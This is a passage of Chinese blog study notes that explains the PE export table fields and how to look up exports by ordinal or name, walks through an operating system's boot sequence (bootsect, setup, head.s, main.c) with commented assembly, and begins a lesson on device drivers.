<li><p>静态地址跟踪：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665970609979.png"><br>如图所示，在静态文件中，第一个字段和第五个字段指向的地址不同，因为是不同的结构体。但是结构体中存储的内容是一致的。</p>
</li>
</ol>
<h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><h3 id="导出表概述"><a href="#导出表概述" class="headerlink" title="导出表概述"></a>导出表概述</h3><blockquote>
<p>一般情况下 ，PE 中的导出表存在于动态链接库文件里 。<br><strong>导出表的主要作用</strong>是将 PE 中存在的函数引出到外部，以便其他人可以使用这些函数，实现代码的重用 。</p>
</blockquote>
<p>通过函数名<br>通过索引</p>
<p>IAT会覆盖为函数VA(不是RVA),覆盖的依据为导出表</p>
<p>DLL文件加载到内存空间，也是一个PE文件，其结构与前相同。（也有Base,装载基址）</p>
<p>所以一个很关键的点在于：理清寻址的过程、</p>
<h3 id="导出表的结构"><a href="#导出表的结构" class="headerlink" title="导出表的结构"></a>导出表的结构</h3><blockquote>
<p>PE头偏移78H的位置就是导出表的位置</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1666932649511.png"></p>
<p>上图为<strong>导出表的数据结构</strong>。其中字段的含义也已经给出，这里我们需要<strong>重点了解</strong>的是以下几个字段：</p>
<ul>
<li><strong>NumberOfFunctions</strong>：文件中包含的<strong>导出函数的总数</strong>。</li>
<li><strong>NumberOfNames</strong>：被<strong>定义函数名称</strong>的导出函数的总数。</li>
</ul>
<blockquote>
<p>上二字段解析：只有<code>NumberOfNames</code>数量的函数既可以用<strong>函数名方式导出</strong>，也可以用<strong>序号方式导出</strong>，剩下 的<code>NumberOfFunctions 减去NumberOfNames</code> 数量的函数只能<strong>用序号方式导出</strong>。该字段的值只会小于或者等于 NumberOfFunctions 字段的值，如果这个值是0，表示所有的函数都是以序号方式导出的。</p>
</blockquote>
<ul>
<li><strong>AddressOfFunctions</strong>：一个RVA 值，指向包含<strong>全部导出函数入口地址</strong>的<code>双字数组</code>。数组中的每一项是一个RVA 值，数组的项数等于NumberOfFunctions 字段的值。（这个字段很重要，因为函数的导出最终都要归到这个表里，根据索引查找入口地址）</li>
<li></li>
<li><strong>Base</strong>：<strong>导出函数序号的起始值</strong>，将AddressOfFunctions 字段指向的入口地址表的索引号加上这个起始值就是对应函数的导出 序号。假如Base 字段的值为x，那么入口地址表指定的第1个导出函数的序号就是x；第2个导出函数的序号就是x＋1。总之，一个<strong>导出函数的导出序号等于Base 字段的值加上其在入口地址表中的位置索引值</strong>。</li>
</ul>
<blockquote>
<p><strong>上二字段解析</strong>：最终目的是获取到入口地址，而入口地址的获取是根据索引来的，所以我们要先得到一个函数的索引值。对于通过序号导出的函数，其<strong>索引号等于序号-Base.</strong></p>
</blockquote>
<ul>
<li><strong>AddressOfNames 和 AddressOfNameOrdinals</strong>：均为RVA 值。前者指向<strong>函数名字符串地址表</strong>。这个地址表是一个<code>双字数组</code>，数组中的每一项指向一个函数名称字符串的RVA。数组的项数等于<code>NumberOfNames</code> 字段的值，所有有名称的导出函数的名称字符串都定义在这个表中；后者指向另一个<strong>word 类型的数组</strong>（注意<code>不是双字数组</code>）。数组项目与文件名地址表中的项目一一对应，项目值代表函数入口地址表的<strong>索引</strong>，这样<strong>函数名称与函数入口地址关联起来</strong>。</li>
</ul>
<p>看一下最终的结构图：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1666933447805.png"></p>
<h3 id="导出表实训"><a href="#导出表实训" class="headerlink" title="导出表实训"></a>导出表实训</h3><p><strong>实训目的</strong>：找到</p>
<p><strong>实训步骤</strong>：首先要先理清思路，从<strong>序号和名称</strong>两个角度：</p>
<blockquote>
<p><strong>从序号查找函数入口地址</strong>：简单说就是，<strong>序号-base</strong> 对应找到AddressOfFunctions 的第几项</p>
<blockquote>
<p>1-定位到<strong>PE文件头</strong><br>2- 从PE 文件头中的 <strong>IMAGE_OPTIONAL_HEADER32 结构</strong>中取出数据目录表，并从第一个数据目录中得到<strong>导出表的RVA</strong><br>3- 从导出表的 <strong>Base 字段</strong>得到起始序号<br>4- 将需要<strong>查找的导出序号减去起始序号</strong>，得到函数在入口地址表中的<strong>索引</strong><br>5- 检测索引值是否大于导出表的 <code>NumberOfFunctions</code> 字段的值，如果大于后者的话，说明<strong>输入的序号是无效的</strong><br>6- 用这个索引值在 <code>AddressOfFunctions</code> 字段指向的导出函数入口地址表中取出相应的项目，这就是<strong>函数入口地址的RVA 值</strong>，当函数被装入内存的时候，这个RVA 值加上模块实际装入的基地址，就得到了函数真正的入口地址 。</p>
</blockquote>
</blockquote>
<blockquote>
<p>从函数名称查找函数入口地址:</p>
<blockquote>
<p>1- 最初的步骤是一样的，那就是首先得到<strong>导出表的地址</strong><br>2- 从导出表的 <code>NumberOfNames</code> 字段得到已<strong>命名函数的总数</strong>，并以这个数字作为循环的次数来构造一个循环 从 <code>AddressOfNames</code> 字段指向得到的函数名称地址表的第一项开始，在循环中将每一项定义的函数名与<strong>要查找的函数名相比较</strong>，如果没有任何一个函数名是符合的，表示文件中没有指定名称的函数 ；如果某一项定义的函数名<strong>与要查找的函数名符合</strong>，那么记下这个函数名在字符串地址表中的<strong>索引值</strong>，然后在 <code>AddressOfNamesOrdinals</code> 指向的数组中以同样的索引值取出数组项的值，我们这里假设这个值是x 最后，以 x 值作为索引值，在 <code>AddressOfFunctions</code> 字段指向的函数入口地址表中获取的 RVA 就是函数的入口地址。<br><strong>简单说是</strong>：查找AddressOfNames ，对应到a项，取AddressOfNamesOrdinals 的第a项的值得到b，取AddressOfFunctions 的第b项</p>
</blockquote>
</blockquote>
<p><strong>注</strong>： 一定要记住导出表中的关键字段的值，比如：各个函数数目、base、各个地址表的数组大小等。</p>
]]></content>
      <categories>
        <category>【-专业知识-】逆向工程知识</category>
        <category>PE文件基础</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>（第一节）操作系统--第一个界面说起</title>
    <url>/2022/08/01/%EF%BC%88%E7%AC%AC%E4%B8%80%E8%8A%82%EF%BC%89%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F--%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%95%8C%E9%9D%A2%E8%AF%B4%E8%B5%B7/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：由于视频集数较多、涉及到的内容也很多，所以此专题会分多篇文章进行记录。课程来自B站哈工大李老师的操作系统。<a href="https://www.bilibili.com/video/BV1iW411Y73K/">操作系统哈尔滨工业大学李治军老师_哔哩哔哩_bilibili</a></p>
</blockquote>
<h1 id="揭开钢琴的盖子"><a href="#揭开钢琴的盖子" class="headerlink" title="揭开钢琴的盖子"></a>揭开钢琴的盖子</h1><blockquote>
<p>钢琴本身就是一个操作系统，其内部是很复杂的。如果只会弹琴，而不去了解其内部结构，就只能弹而不会改。所以我们要揭开钢琴的盖子，去学习其内部复杂的构造。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1658315528962.png"></p>
<p>上图是我们电脑开机后的第一个画面，那么<code>这个画面背后正发生着什么呢</code>？</p>
<p>要了解其中发生的事情，需要我们结合计算机的<strong>工作原理</strong>和<strong>基本常识</strong>来进行。下面我们就来介绍一下计算机的发展流程和工作原理，再循着工作原理从<strong>汇编代码的</strong>层次来解析一下这个开机画面的<strong>底层实现</strong>。</p>
<h2 id="计算机的发展与工作原理"><a href="#计算机的发展与工作原理" class="headerlink" title="计算机的发展与工作原理"></a>计算机的发展与工作原理</h2><blockquote>
<p>从白纸到图灵机</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1658460982078.png"></p>
<p>从上图可知，计算机就是一个自动化的<code>计算模型</code>，通过控制器实现一个具体的事件，比如图中所示的加法。</p>
<p>但是，上图所示的图灵机只可以进行单个特定的事件。</p>
<blockquote>
<p>从图灵机到通用图灵机</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1658461169245.png"></p>
<p>通过设置控制器动作来指定操作器的实现，其实就是一个程序。</p>
<blockquote>
<p>从通用图灵机到计算机</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1658461265588.png"></p>
<p>计算机相比于通用图灵机，一个很重要的突破：<code>存储程序思想</code>。即将指令和数据存储到计算机内部设备，而后控制器读取、解码并执行相应指令。</p>
<p>前进一步却是质的飞跃。冯诺依曼用存储程序思想完美解释了图灵机的两个核心概念：<strong>运算规则</strong>、<strong>学会的含义</strong></p>
<ul>
<li><strong>运算规则</strong>：一个指令序列</li>
<li><strong>学会的含义</strong>：将指令序列中的指令逐条取出并解释执行</li>
</ul>
<h2 id="从汇编代码来始界看起面"><a href="#从汇编代码来始界看起面" class="headerlink" title="从汇编代码来始界看起面"></a>从汇编代码来始界看起面</h2><blockquote>
<p>前面我们已经知道，计算机的操作流程：取指、执行。起始界面也不例外。当然，<strong>界面只是计算机启动的一部分</strong>，在其背后还有很多无法直观看到的程序操作，下面我们就一一介绍。</p>
</blockquote>
<h4 id="计算机启动执行的第一个程序"><a href="#计算机启动执行的第一个程序" class="headerlink" title="计算机启动执行的第一个程序"></a>计算机启动执行的第一个程序</h4><blockquote>
<p>第一部分程序就是<strong>引导扇区程序</strong>，占512字节，主要作用就是：<code>实现代码位置的移动</code>、将<code>后续两个模块载入内存</code>并<code>将启动界面打到屏幕上</code>。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1658461698850.png"></p>
<p><code>ROM BIOS映射区</code>是<strong>通电</strong>后内存中<strong>唯一一个存在代码</strong>的地方，也是CPU执行命令的<strong>起点</strong>。（只有有代码才可以取指执行）</p>
<p>这段区域的代码主要有以下<strong>几个功能</strong>：</p>
<ol>
<li><strong>检查</strong>RAM、键盘、显示器、软硬磁盘等<strong>硬件设施</strong>。</li>
<li>将磁盘0磁道、0扇区<strong>读入内存</strong>0x7c00处。（共512字节，一个扇区，也叫引导扇区）</li>
<li>将CS&#x3D;0x07c0,IP&#x3D;0000。（设置<strong>下一步执行</strong>的指令位置，也就是引导扇区位置）</li>
</ol>
<hr>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1658461984959.png"></p>
<p>在执行完BIOS后会跳转到<strong>0x7c00位置</strong>，执行此处的指令。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1658462133939.png"></p>
<p>上图就是引导扇区存储的指令，我们从<code>汇编语言的角度来解析</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&gt;&gt;&gt;&gt; bootsect.s</span><br><span class="line"></span><br><span class="line">mov ax #BOOTSEC   mov ds,ax  ==  最终将#BOOTSEC存放到ds寄存器（数据段寄存器,存储<span class="number">0x7c00</span>）</span><br><span class="line">mov ax,#INITSEC   mov es,ax  ==  最终将#INITSEC存放es寄存器（也是段寄存器，存储<span class="number">0x9000</span>)</span><br><span class="line"></span><br><span class="line">mov ax,#<span class="number">256</span>  ==  将<span class="number">256</span>存储到ax</span><br><span class="line"></span><br><span class="line">sub si,si     sub di,di  ==  将si与di寄存器置零。（与DS和ES配合构成两个地址，一个是源地址，一个是目的地址）</span><br><span class="line"></span><br><span class="line">rep movw  ==  移动<span class="number">256</span>字，将BOOTSEC位置数据移动到INITSEC位置（从<span class="number">0x7c00</span>到<span class="number">0x90000</span>)</span><br><span class="line"></span><br><span class="line">!!! 上一步的作用是为了腾出空间让其他程序使用。（后面具体介绍）!!!</span><br><span class="line"></span><br><span class="line">jmpi go,INITSEC  ==  跳转到对应位置去执行go程序（INITSEC为CS go为IP，也就是从执行到go的偏移）</span><br><span class="line"></span><br><span class="line">!!! 上代码的作用就是继续执行引导扇区代码，因为已经将其移动，所以要跳到移动后的位置上去!!!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面详细解释了代码，请仔细观看。其<strong>作用</strong>就是：<code>移动程序以腾出空间，位置跳转以顺序执行</code>。</p>
<blockquote>
<p>下面我们<strong>继续解释代码</strong>，接着上一条代码去讲。具体代码如下图：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1658462335440.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; bootsect.s</span><br><span class="line"></span><br><span class="line">go:mov ax,cs <span class="comment">//将cs存储的数据放到ax，此数据为0x9000</span></span><br><span class="line">    mov ds,ax     mov es,ax     </span><br><span class="line">    mov ss,ax     mov sp,#<span class="number">0xff00</span>     <span class="comment">// 这两行的作用就是更新段寄存器的数据，包括数据寄存器，栈寄存器等，也定义了栈顶地址。</span></span><br><span class="line">    </span><br><span class="line">load_setup:    <span class="comment">// 下面代码用于将setup模块载入内存</span></span><br><span class="line">    mov dx,#<span class="number">0x0000</span>   mov cx,#<span class="number">0x0002</span>   mov bx,#<span class="number">0x0200</span>  </span><br><span class="line">    mov ax,#<span class="number">0x0200</span>+SETUPLEN   <span class="type">int</span> <span class="number">0x13</span>  <span class="comment">//BIOS中断，用于读取磁盘数据。参数通过上一行代码实现，具体含义见图片介绍。</span></span><br><span class="line">    jnc ok_load_setup</span><br><span class="line">    mov ax,#<span class="number">0x0000</span> </span><br><span class="line">    mov ax,#<span class="number">0x0000</span> <span class="comment">//复位</span></span><br><span class="line">    <span class="type">int</span> <span class="number">0x13</span></span><br><span class="line">    j   Load_setup</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>已将对应代码解释清楚，这一段代码的主要作用就是：<code>将setup数据从磁盘载入内存</code>（使用13号中断，读取引导扇区后面的4个扇区的内容）并执行<code>ok_load_setup</code> 和 <code>load_setup</code>.</p>
<p><strong>注</strong>：setup载入的位置紧靠bootsect，也就是0x90200.通过<code>ES:BX</code>给出此地址。</p>
<blockquote>
<p>下面我们继续往下走，看一下<code>ok_load_setup</code>处的代码：（主要介绍一下重点部分）</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1658462452746.png"></p>
<p>这一部分代码主要涉及到<code>页面显示</code>和<code>后续跳转</code>两部分。</p>
<ul>
<li>页面显示主要通过<code>int 0x10</code>中断进行，通过<strong>对应参数</strong>和<strong>数据</strong>来将启动界面打到屏幕上。（msg1存储的就是启动界面的数据，其位置在引导扇区的末尾）<a href="https://blog.csdn.net/qq_40169767/article/details/101511805">补充int 0x10的介绍</a></li>
<li>后续跳转就是调用 <code>raed_it</code>实现</li>
</ul>
<blockquote>
<p>上面介绍了<code>ok_load_setup</code>部分代码，下面我们来介绍一下<code>read_it</code>代码。注意执行完毕read_it后还要回到此处。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1658462481631.png"></p>
<p>此部分代码将<code>system模块</code>写入内存，引导扇区的代码就算执行完毕，接下来就算执行后续setup和system了.</p>
<hr>
<blockquote>
<p><strong>bootsect程序总结</strong></p>
</blockquote>
<p><code>bootsect.s</code>的主要工作包括<strong>以下几个部分</strong>：</p>
<ol>
<li>将磁盘上从<strong>第二到第五扇区</strong>即构成的<code>setuo模块</code>读到内存<code>0x9200</code>处。</li>
<li>在显示器上<strong>输出操作系统标识</strong></li>
<li>从磁盘<strong>第六个扇区之后</strong>读入<code>system模块</code>并将其放到<code>0x10000</code>处</li>
</ol>
<h4 id="setup程序的执行"><a href="#setup程序的执行" class="headerlink" title="setup程序的执行"></a>setup程序的执行</h4><blockquote>
<p>操作系统第一部分即引导扇区部分代码执行完毕，接下来就要执行setup程序即setup.s。</p>
<blockquote>
<p>setup将完成os启动前的设置，具体包括：<code>读取并保存硬件参数参数</code>和<code>模式切换</code></p>
</blockquote>
</blockquote>
<p>下图给出了<strong>setup模块</strong>的<code>核心代码</code>，不同版本的操作系统代码或许不同，但是核心功能是差不多的。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659269099757.png"></p>
<p>上图代码可以分为<strong>两个部分</strong>：</p>
<ul>
<li><code>start</code>:用于<strong>硬件信息的读取</strong>，主要涉及到int 0x15中断。这一模块的主要功能就是将操作系统建立起来，所以硬件信息特别是内存大小需要提前获取并保存在0x9000处。</li>
<li><code>do_move</code>:进行<strong>数据的移动</strong>，其中<code>ds:si</code>确定源地址；<code>es:di</code>确定目的地址，即0x0000.也就是将<strong>操作系统的system模块代码</strong>移动到内存地址为<code>0x0000</code>的位置。</li>
</ul>
<p><strong>注</strong>：我们前面介绍bootsect代码时提到，其中有一段代码用于<strong>数据的移动</strong>，将代码从0x7c00移动到0x9000，就是为了防止此处移动后照成<strong>数据的破坏</strong>，因为system模块内容很多。</p>
<blockquote>
<p>有一个问题：内存地址为0的位置不是存储了中断向量表吗？移动数据到此不会破坏数据吗？</p>
</blockquote>
<p>这个答案很简单，因为setup模块执行完毕后就要进入<code>保护模式</code>，在这个模式下中断的调用与原来实模式不同了。不再使用原先的<strong>BIOS中断</strong>，而是建立<strong>新的IDT表</strong>并设置新的中断函数。</p>
<p><a href="https://zhuanlan.zhihu.com/p/42309472">传送门：操作系统保护模式和实模式的区别</a></p>
<p>其实二者最本质的区别在于<code>cpu对于指令的解析方式</code>不同。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659274448824.png"></p>
<p>上图就给出了setup进行<strong>模式切换</strong>的指令，通过<code>cr0寄存器</code>进行。（<strong>涉及到硬件的很多主要控制都是通过设置CR0寄存器完成的</strong>，比如后面要学习的<strong>分页机制的启动</strong>等）</p>
<p>当计算机切换到保护模式，CPU在解析指令时就会使用区别于实模式的电路。（具体内容会在<code>内存管理</code>中介绍）</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659274664887.png"></p>
<p>在保护模式下，cpu的<strong>寻址方式</strong>发生了变化，不再使用cs直接存储内存地址，而是<strong>存储表项下标</strong>，而后通过<strong>查表获取</strong>具体地址。</p>
<blockquote>
<p>既然要查表，首先要先有表，这里的表就是gdt表，也叫<code>全局描述符表</code>。</p>
<blockquote>
<p>关于更多GDT表的知识看一看一下<code>扩展知识篇</code>。</p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659274873097.png"></p>
<p>上图就给出了gdt表的<strong>初始化方式</strong>。在给定cs后就要根据其值进行查表，获取一个32位的地址。（此时IP也是32位寄存器）</p>
<blockquote>
<p>与bootsect模块一样，setup模块也要进行指令跳转，以执行新的模块部分。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659275483733.png"></p>
<p>上图给出的 <code>jmpi 0,8</code> 就是一条<strong>保护模式</strong>下的跳转指令，其目的是跳转到<code>0x0000</code>处执行<code>system模块</code>。</p>
<h4 id="system模块执行"><a href="#system模块执行" class="headerlink" title="system模块执行"></a>system模块执行</h4><blockquote>
<p>system模块是setup模块之后要执行的模块。在具体介绍各个部分之前，先来看一下操作系统的设计。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659276211172.png"></p>
<p><code>Image</code>就是<strong>操作系统镜像</strong>，这个镜像的形成依赖于很多<strong>子模块</strong>，例如：bootsect、setup、system等，而这些子模块也依赖于更多的子模块，最终形成一个<code>树结构</code>。</p>
<blockquote>
<p>system模块的第一部分代码：<code>head.s</code></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659276415894.png"></p>
<p>上图就是head.s的代码，主要关注一个部分：对gdt和idt表进行<strong>重新初始化</strong>。</p>
<p><strong>注</strong>：在上图中，还要注意一下使用的汇编语言的不同。这里使用了32位汇编。对于汇编语言的具体介绍我们会单独介绍。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659276949172.png"></p>
<p>上图给出了跳转的流程：与函数调用机制类似，先传入参数和返回地址，之后使用ret进行跳转。</p>
<p>head.s需要在初始化之前进行一些准备工作：<code>设置中断表</code>（不再使用BIOS中断）、<code>设置GDT表</code>（进入system模块需要重新设置）、<code>设置页表</code>（查询得到真正的物理地址）</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659413513427.png"></p>
<p>如<strong>上图代码</strong>所示，<strong>IDT表和GDT表</strong>的本质就是<strong>两个内存空间</strong>，所以只需要设计两个包含<strong>连续8B内存</strong>的数组即可；之后再将<strong>这两个表的基址</strong>通过<code>lidt</code>和<code>lgdt</code>指令分别保存到<code>IDTR</code>和<code>GDTR</code>寄存器中。</p>
<p>对于<strong>两表的初始化</strong>：IDT表的值全0，表示<strong>中断不可用</strong>，在之后的<strong>各模块初始化时</strong>会设置对应的中断程序地址到表项里（前面我们使用的BIOS中断不再使用）；而GDT表的初始化与前面<strong>setup模块设置</strong>一致，都是设置一段内存空间并将<strong>段基址</strong>传入，主要是<strong>内核代码段、数据段</strong>等。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659413649333.png"></p>
<p>上图<strong>很重要</strong>，实际上操作系统启动的所有流程都是为了形成这样一张<code>内存图</code>。</p>
<p>上图并<strong>不是一个完整的内存视图</strong>，而是<code>操作系统内核</code>在内存中的视图，也就是说内存拿出来<strong>1M大小</strong>的空间用于<strong>存储操作系统内核</strong>，其他部分为<strong>用户态区域</strong>。</p>
<p>通过<strong>观察此内存视图</strong>，可知：<code>页表、页目录表、IDT、GDT表</code>都在这个区域内，并且其<strong>基址</strong>都保存在<strong>对应的寄存器</strong>中以便于寻址查询。而<code>main.c</code>程序也在这个区域，此程序用来完成<strong>操作系统启动的最后一个步骤</strong>。同时，一些<strong>硬件信息</strong>也被存储在了这个区域<code>0x9000</code>位置，这些硬件信息是<code>setup模块</code>获取的，用于后续main.c中进行<strong>数据结构的初始化</strong>。</p>
<blockquote>
<p><strong>system模块的第二部分代码</strong>：<code>main.c</code></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659277213030.png"></p>
<p>上图给出了<code>main.c</code>的代码，其实就是很多<strong>初始化的函数</strong>，用于对<strong>内存、设备、cpu</strong>等进行初始化，之后启动一个<strong>shell执行指令</strong>。</p>
<p>我们以其中一个<code>mem_init()</code>函数为例子：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659277401764.png"></p>
<p>通过<code>mem_init</code>进行<strong>内存的初始化</strong>，借助参数进行<strong>内存的划分</strong>，以供后续使用。其中将管理的<strong>起始内存地址</strong>设置为<code>4MB</code>，因为<strong>0-1MB为系统内核</strong>、<strong>1-4MB为磁盘高速缓存区</strong>；结束地址由<code>0x9000</code>处存储的内存信息决定。</p>
<p>其他部分代码也是这样，这些初始化函数共同完成操作系统的初始化工作。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>前面我们从<strong>底层代码</strong>的角度和<strong>核心功能</strong>出发介绍了操作系统的各个模块：<code>bootsect、setup、system</code>。</p>
<p>这三个模块实现的功能各不相同，但是归根结底还是为了实现这<strong>两个结果</strong>：<code>操作系统的写入</code>、<code>操作系统的建立</code>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659413178164.png"></p>
<blockquote>
<p>为什么要写入操作系统？</p>
</blockquote>
<p>因为计算机的工作原理就是：<code>取指执行</code>，只要内存中有指令才可以进行工作。所以第一步要将操作系统的<code>源码写入内存</code>。</p>
<blockquote>
<p>为什么要进行初始化？</p>
</blockquote>
<p>因为操作系统是一个便于<strong>操作硬件</strong>的软件，所以要针对不同的硬件<strong>获取关键参数</strong>、<strong>初始化不同的数据结构</strong>，从而实现对硬件的管理。</p>
<hr>
<blockquote>
<p><strong>写在最后</strong>：</p>
</blockquote>
<p>到这里，对于操作系统学习的第一个部分就结束了。这一节详细结束了操作系统的<code>启动流程</code>，要先理清这个流程，有一个<strong>大体的框架</strong>，而后再查缺补漏，将一些扩展的知识点进行记录学习。</p>
<p>下一节就要进入到<strong>操作系统接口的实现</strong>。</p>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>（第七节）操作系统--设备驱动</title>
    <url>/2022/08/21/%EF%BC%88%E7%AC%AC%E4%B8%83%E8%8A%82%EF%BC%89%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F--%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong></p>
<blockquote>
<p>前面我们介绍了<strong>CPU管理</strong>和<strong>内存管理</strong>部分，通过其完成了操作系统中的<strong>多进程视图</strong>的构建。<br>后续我们将要进行<strong>IO设备驱动</strong>的相关知识的学习。涉及到的IO设备主要有<strong>键盘、显示器、磁盘</strong>这三个，其中这一节介绍<strong>键盘和显示器</strong>驱动管理，会通过<strong>具体的示例</strong>来介绍操作系统是如果管理这两个设备的；而<strong>磁盘</strong>这一设备又涉及到文件系统，所以<strong>后面单独开一节内容</strong>进行介绍。</p>
</blockquote>
</blockquote>
<h1 id="设备驱动的基本原理"><a href="#设备驱动的基本原理" class="headerlink" title="设备驱动的基本原理"></a>设备驱动的基本原理</h1><p>不论是<code>磁盘</code>还<code>是键盘、显示器</code>，都是属于外部设备，而操作系统通过<strong>驱动</strong>管理这些硬件。所以在具体介绍这些设备的管理与实现流程前，先来介绍一些<strong>设备驱动的基本原理</strong>。</p>
<h2 id="外设的工作原理"><a href="#外设的工作原理" class="headerlink" title="外设的工作原理"></a>外设的工作原理</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661049214883.png"></p>
<p>如图所示，即为<strong>外设</strong>的<strong>工作原理</strong>：</p>
<ol>
<li><strong>CPU发送命令</strong>给外设，最终归结到执行指令“<code>out ax,端口号</code>”</li>
<li>命令<strong>执行完毕后</strong>控制器执行<strong>中断处理</strong></li>
</ol>
<h2 id="文件视图"><a href="#文件视图" class="headerlink" title="文件视图"></a>文件视图</h2><blockquote>
<p>为了让外设的使用更加方便，要提供一种<strong>统一的视图</strong>，这个视图就是<code>文件视图</code>。</p>
</blockquote>
<blockquote>
<p><strong>问</strong>：为什么要提供统一的视图？</p>
<blockquote>
<p><strong>答</strong>：操作系统控制硬件执行就是向这些<strong>设备控制器的寄存器中写入指令</strong>，但是不同的外部设备往往其<strong>控制器也不同</strong>，写入前需要<strong>查寄存器地址</strong>、<strong>内容格式和语义</strong>等，这对于用户来说<strong>太复杂</strong>了。所以要<strong>引入文件视图</strong>将这个过程<strong>简单化、标椎化</strong>。</p>
</blockquote>
</blockquote>
<blockquote>
<p>所以前面介绍的<strong>外设的工作原理</strong>还要<code>加上一条</code>：<strong>建立文件视图</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661049347270.png"></p>
<p>如上图所示，其中的代码就是<strong>操纵外设的程序</strong>：通过<code>open()</code>打开对应的<strong>设备文件</strong>。其具体的视图如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661049374062.png"></p>
<p>在使用<strong>了统一的文件视图</strong>后，用户对于<strong>外设的操作</strong>和对<strong>文件的操作</strong>是完全一样的，换句话说，用户可以<strong>忽略诸如端口号、指令格式等细节</strong>，因为<strong>操作系统</strong>会负责<strong>将这些设备文件展开成对设备的具体操作</strong>，形成一系列<strong>out语句</strong>。而<code>完成这个展开工作就是外设管理的核心任务，也是我们下面要具体介绍的</code>。</p>
<h1 id="显示器的驱动"><a href="#显示器的驱动" class="headerlink" title="显示器的驱动"></a>显示器的驱动</h1><blockquote>
<p>下面我们会从<code>printf</code>出发，以<strong>具体的代码</strong>来分析<strong>显示器驱动执行</strong>的流程。</p>
</blockquote>
